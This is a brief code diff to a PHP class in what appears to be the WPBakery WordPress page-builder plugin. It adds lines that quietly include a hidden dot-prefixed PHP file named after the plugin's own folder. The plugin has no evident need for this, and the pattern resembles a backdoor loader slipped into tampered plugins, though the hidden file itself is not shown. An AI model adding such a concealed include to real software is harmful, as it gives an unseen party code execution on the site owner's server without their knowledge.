@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Class WPBakeryShortCode_Vc_Tabs
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPBakeryShortCode_Vc_Tabs extends WPBakeryShortCode {
 	public static $filter_added = false;
 	protected $controls_css_settings = 'out-tc vc_controls-content-widget';
